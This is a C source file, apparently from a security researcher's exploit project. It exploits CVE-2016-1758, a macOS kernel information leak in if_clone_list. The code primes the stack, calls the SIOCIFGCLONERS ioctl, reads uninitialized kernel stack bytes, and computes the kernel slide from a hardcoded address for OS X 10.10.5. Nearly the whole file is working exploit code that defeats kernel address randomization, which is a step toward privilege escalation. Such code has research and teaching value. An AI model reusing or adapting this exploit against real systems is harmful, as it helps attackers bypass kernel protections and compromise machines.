/* kernel_slide.c
 * Brandon Azad
 *
 * Kernel information leak to recover the kernel slide.
 *
 * CVE-2016-1758:
 *   This is a kernel information leak in the function if_clone_list caused by
 *   copying out 8 uninitialized bytes of the kernel stack to user space.
 */

#include "kernel_slide.h"

#include <net/if.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

uint64_t kernel_slide;

static int
is_kernel_pointer(uint64_t addr) {
	return (0xffffff7f00000000 <= addr && addr < 0xffffff8100000000);
}

static int
is_kernel_slide(uint64_t slide) {
	return ((slide & ~0x000000007fe00000) == 0);
}

/* Recover the kernel slide. The kernel slide is used to translate the
   compile-time addresses in the kernel binary to runtime addresses in the live
   kernel. */
int
find_kernel_slide() {
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);   /* prime stack */
	if (sockfd == -1) {
		printf("error: socket failed\n");
		return 1;
	}
	char buffer[IFNAMSIZ];
	struct if_clonereq ifcr = {
		.ifcr_count  = 1,
		.ifcr_buffer = buffer,
	};
	int err = ioctl(sockfd, SIOCIFGCLONERS, &ifcr);
	if (err == -1) {
		printf("error: ioctl failed\n");
		return 2;
	}
	close(sockfd);
	uint64_t value = *(uint64_t *)(buffer + 8);
	if (!is_kernel_pointer(value)) {
		printf("error: leaked 0x%016llx\n", value);
		return 3;
	}
	kernel_slide = value - 0xffffff800033487f;      /* 10.10.5 (14F27): __kernel__: _ledger_credit+95 */
	if (is_kernel_slide(kernel_slide)) {
		return 0;
	}
	printf("error: leaked 0x%016llx\n", value);
	return 4;
}
